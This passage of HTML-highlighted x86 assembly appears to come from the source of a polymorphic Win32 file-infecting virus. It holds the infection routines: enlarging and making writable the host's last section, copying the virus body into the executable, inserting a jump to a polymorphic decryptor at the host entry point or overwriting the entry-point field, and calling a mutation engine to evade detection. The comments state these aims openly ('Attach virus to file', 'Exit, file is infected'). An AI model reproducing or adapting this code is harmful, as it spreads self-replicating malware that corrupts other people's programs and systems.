                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">original_size</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">inf_size</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc5">SIZE_PADDING</span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">
                </span><span class="sc6">div</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
                </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">mul</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">my_FindData.WFD_nFileSizeLow</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">open_map_file</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">done_re_open</span><span class="sc0">
                </span><span class="sc6">stc</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">done_re_open</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc1">;ebx - host base address all along the following code</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">

                </span><span class="sc1">;Initialize poly engine register table</span><span class="sc0">
                </span><span class="sc1">;We are going to insert some garbage code at host</span><span class="sc0">
                </span><span class="sc1">;entry-point, followed by a JMP to polymorphic</span><span class="sc0">
                </span><span class="sc1">;decryptor</span><span class="sc0">
                </span><span class="sc1">;This routine will also initialize random number</span><span class="sc0">
                </span><span class="sc1">;generator</span><span class="sc0">

                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">init_poly</span><span class="sc0">

                </span><span class="sc1">;Check for relocations over entry-point code</span><span class="sc0">

                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">get_last_sh</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc5">OH_DataDirectory.</span><span class="sc0">        \
                                       </span><span class="sc5">DE_BaseReloc.</span><span class="sc0">            \
                                       </span><span class="sc5">DD_VirtualAddress</span><span class="sc4">]</span><span class="sc0">

                </span><span class="sc1">;Lovely file, no relocations, so we cant generate</span><span class="sc0">
                </span><span class="sc1">;lots of polymorphic code at host entry-point</span><span class="sc0">

                </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">lovely_file</span><span class="sc0">

                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">RVA2RAW</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc8">esi</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">

                </span><span class="sc1">;ebx - Host base address</span><span class="sc0">
                </span><span class="sc1">;ecx - Pointer to RAW data or NULL if error</span><span class="sc0">
                </span><span class="sc1">;edx - Section delta offset</span><span class="sc0">
                </span><span class="sc1">;esi - Pointer to section RAWDATA</span><span class="sc0">
                </span><span class="sc1">;edi - Pointer to IMAGE_OPTIONAL_HEADER</span><span class="sc0">

                </span><span class="sc1">;Check relocations over host entry-point code</span><span class="sc0">

                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">do_reloc_work</span><span class="sc0">

                </span><span class="sc1">;We have space for inserting some garbage code?</span><span class="sc0">

                </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">00000005h</span><span class="sc0">
                </span><span class="sc6">jb</span><span class="sc0"> </span><span class="sc5">fuxoring_file</span><span class="sc0">

                </span><span class="sc1">;Another lovely file, eh?</span><span class="sc0">

                </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">BUFFER_EP</span><span class="sc0">
                </span><span class="sc6">jb</span><span class="sc0"> </span><span class="sc5">ugly_file</span><span class="sc0">

</span><span class="sc5">lovely_file</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc1">;We reach this code for 3 posible reasons:</span><span class="sc0">
                </span><span class="sc1">;</span><span class="sc0">
                </span><span class="sc1">; 1) When the target file have no relocations or...</span><span class="sc0">
                </span><span class="sc1">; 2) All the relocations are behind the entry-point or...</span><span class="sc0">
                </span><span class="sc1">; 3) We have lots space from entry-point to 1st reloc</span><span class="sc0">

                </span><span class="sc1">;Save number of bytes to restore at host entry-point</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">insert_size</span><span class="sc4">+</span><span class="sc5">mem_size</span><span class="sc4">],</span><span class="sc5">BUFFER_EP</span><span class="sc0">

                </span><span class="sc1">;Get RAW of entry-point</span><span class="sc0">

                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">get_last_sh</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc5">OH_AddressOfEntryPoint</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">RVA2RAW</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">

                </span><span class="sc1">;Generate a piece of polymorphic code at host entry-point</span><span class="sc0">

                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">gen_garbage</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">edi</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">

                </span><span class="sc1">;Insert a jump to virus code at entry point</span><span class="sc0">

                </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">insert_jump</span><span class="sc0">

</span><span class="sc5">ugly_file</span><span class="sc4">:</span><span class="sc0">      </span><span class="sc1">;There are no relocations over first five bytes of</span><span class="sc0">
                </span><span class="sc1">;code at host entry-point</span><span class="sc0">
                </span><span class="sc1">;So we can insert a JUMP to virus polymorphic decryptor</span><span class="sc0">

                </span><span class="sc1">;Save size of code to generate</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">insert_size</span><span class="sc4">+</span><span class="sc5">mem_size</span><span class="sc4">],</span><span class="sc2">00000005h</span><span class="sc0">

                </span><span class="sc1">;Where to place the JUMP</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc5">OH_AddressOfEntryPoint</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">RVA2RAW</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">

                </span><span class="sc1">;Insert a jump to virus code at entry point</span><span class="sc0">

</span><span class="sc5">insert_jump</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0E9h</span><span class="sc0">
                </span><span class="sc6">stosb</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">get_last_sh</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">original_size</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">poly_decryptor</span><span class="sc4">-</span><span class="sc5">Mem_Base</span><span class="sc0">
                </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc5">SH_PointerToRawData</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc5">SH_VirtualAddress</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc5">OH_AddressOfEntryPoint</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">00000005h</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">
                </span><span class="sc6">stosd</span><span class="sc0">

                </span><span class="sc1">;Execution continues on next routine</span><span class="sc0">

</span><span class="sc1">;ииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииии</span><span class="sc0">
</span><span class="sc1">;Attach virus to file</span><span class="sc0">
</span><span class="sc1">;ииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииии</span><span class="sc0">

</span><span class="sc5">back2infection</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc1">;We fall here after the entry-point stuff</span><span class="sc0">
                </span><span class="sc1">;Complete infection and do polymorphic encryption</span><span class="sc0">
                                                                 
                </span><span class="sc1">;Save current system time inside virus body</span><span class="sc0">

                </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">inf_time</span><span class="sc4">+</span><span class="sc5">mem_size</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">a_GetSysTime</span><span class="sc4">]</span><span class="sc0">

                </span><span class="sc1">;Generate polymorphic encryption</span><span class="sc0">

                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">mutate</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">

                </span><span class="sc1">;Get pointer to last section</span><span class="sc0">

                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">get_last_sh</span><span class="sc0">

                </span><span class="sc1">;ebx - Host base address</span><span class="sc0">
                </span><span class="sc1">;esi - IMAGE_OPTIONAL_HEADER</span><span class="sc0">
                </span><span class="sc1">;edi - Pointer to last section header</span><span class="sc0">

                </span><span class="sc1">;Get new SizeOfRawData and VirtualSize</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">my_FindData.WFD_nFileSizeLow</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">mem_size</span><span class="sc4">-</span><span class="sc5">inf_size</span><span class="sc0">
                </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc5">SH_PointerToRawData</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc5">SH_VirtualSize</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">jbe</span><span class="sc0"> </span><span class="sc5">ok_VirtualSize</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc5">SH_VirtualSize</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc5">ok_VirtualSize</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc5">OH_FileAlignment</span><span class="sc4">]</span><span class="sc0">                
                </span><span class="sc6">div</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
                </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">mul</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc5">SH_SizeOfRawData</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">

                </span><span class="sc1">;Set section characteristics</span><span class="sc0">

                </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc5">SH_Characteristics</span><span class="sc4">],</span><span class="sc0"> \
                       </span><span class="sc5">IMAGE_SCN_MEM_READ</span><span class="sc0"> </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc5">IMAGE_SCN_MEM_WRITE</span><span class="sc0">

                </span><span class="sc1">;Update OH_SizeOfImage</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">my_FindData.WFD_nFileSizeLow</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc5">OH_SizeOfImage</span><span class="sc4">]</span><span class="sc0">               
                </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">
                </span><span class="sc6">jae</span><span class="sc0"> </span><span class="sc5">done_image_s</span><span class="sc0">
                </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc5">mem_size</span><span class="sc4">]</span><span class="sc0">                
</span><span class="sc5">done_image_s</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc5">OH_SectionAlignment</span><span class="sc4">]</span><span class="sc0">                
                </span><span class="sc6">div</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
                </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">mul</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc5">OH_SizeOfImage</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">

                </span><span class="sc1">;Write virus into memory mapped file</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc5">inf_size</span><span class="sc0">
                </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Mem_Base</span><span class="sc4">+</span><span class="sc5">mem_size</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">original_size</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">rep</span><span class="sc0"> </span><span class="sc6">movsb</span><span class="sc0">

                </span><span class="sc1">;Free memory mapped file</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">unmap_close</span><span class="sc0">

                </span><span class="sc1">;Exit, file is infected</span><span class="sc0">

                </span><span class="sc6">clc</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">;ииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииии</span><span class="sc0">
</span><span class="sc1">;Get RAW of entry</span><span class="sc0">
</span><span class="sc1">;ииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииии</span><span class="sc0">

</span><span class="sc1">;ииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииии</span><span class="sc0">
</span><span class="sc1">;Change the entry-point field in file header</span><span class="sc0">
</span><span class="sc1">;ииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииии</span><span class="sc0">

</span><span class="sc5">fuxoring_file</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc1">;Well, after checking relocations for this file we</span><span class="sc0">
                </span><span class="sc1">;found that there is a relocation over the first</span><span class="sc0">
                </span><span class="sc1">;five bytes of host entry-point code</span><span class="sc0">

                </span><span class="sc1">;Our buffer is ZERO bytes coz no code needs to be</span><span class="sc0">
                </span><span class="sc1">;restored on host execution</span><span class="sc0">

                </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">insert_size</span><span class="sc4">+</span><span class="sc5">mem_size</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">

                </span><span class="sc1">;Get the RVA for virus entry-point</span><span class="sc0">

                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">get_last_sh</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">original_size</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">poly_decryptor</span><span class="sc4">-</span><span class="sc5">Mem_Base</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc5">SH_VirtualAddress</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc5">SH_PointerToRawData</span><span class="sc4">]</span><span class="sc0">

                </span><span class="sc1">;Overwrite OH_AddressOfEntryPoint with the</span><span class="sc0">
                </span><span class="sc1">;virus entry point</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc5">OH_AddressOfEntryPoint</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">back2infection</span><span class="sc0">

</span><span class="sc1">;ииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииии</span><span class="sc0">
</span><span class="sc1">;Get pointer to last section header</span><span class="sc0">
</span><span class="sc1">;ииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииии</span><span class="sc0">

</span><span class="sc5">get_last_sh</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc1">;</span><span class="sc0">
                </span><span class="sc1">;Entry:</span><span class="sc0">
                </span><span class="sc1">;</span><span class="sc0">
                </span><span class="sc1">;ebx - Host base address</span><span class="sc0">
                </span><span class="sc1">;</span><span class="sc0">
                </span><span class="sc1">;Exit:</span><span class="sc0">
                </span><span class="sc1">;</span><span class="sc0">
                </span><span class="sc1">;esi - IMAGE_OPTIONAL_HEADER</span><span class="sc0">
                </span><span class="sc1">;edi - Pointer to last section header</span><span class="sc0">
                </span><span class="sc1">; </span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc5">DH_lfanew</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">
                </span><span class="sc6">cld</span><span class="sc0">
                </span><span class="sc6">lodsd</span><span class="sc0">
                </span><span class="sc6">movzx</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc5">FH_NumberOfSections</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">IMAGE_SIZEOF_SECTION_HEADER</span><span class="sc0">
                </span><span class="sc6">mul</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
                </span><span class="sc6">movzx</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc5">FH_SizeOfOptionalHeader</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc5">IMAGE_SIZEOF_FILE_HEADER</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">esi</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">;ииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииии</span><span class="sc0">
</span><span class="sc1">;Convert RVA to RAW</span><span class="sc0">
</span><span class="sc1">;ииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииии</span><span class="sc0">

</span><span class="sc5">RVA2RAW</span><span class="sc4">:</span><span class="sc0">        </span><span class="sc1">;</span><span class="sc0">
                </span><span class="sc1">;Entry:</span><span class="sc0">
                </span><span class="sc1">;</span><span class="sc0">
                </span><span class="sc1">;ebx - Host base address</span><span class="sc0">
                </span><span class="sc1">;edx - RVA to convert</span><span class="sc0">
                </span><span class="sc1">;</span><span class="sc0">
                </span><span class="sc1">;Exit:</span><span class="sc0">
                </span><span class="sc1">;</span><span class="sc0">
                </span><span class="sc1">;ecx - Pointer to RAW data or NULL if error</span><span class="sc0">
                </span><span class="sc1">;edx - Section delta offset</span><span class="sc0">
                </span><span class="sc1">;esi - Pointer to IMAGE_OPTIONAL_HEADER</span><span class="sc0">
                </span><span class="sc1">;edi - Pointer to section header</span><span class="sc0">
                </span><span class="sc1">; </span><span class="sc0">

                </span><span class="sc6">cld</span><span class="sc0">
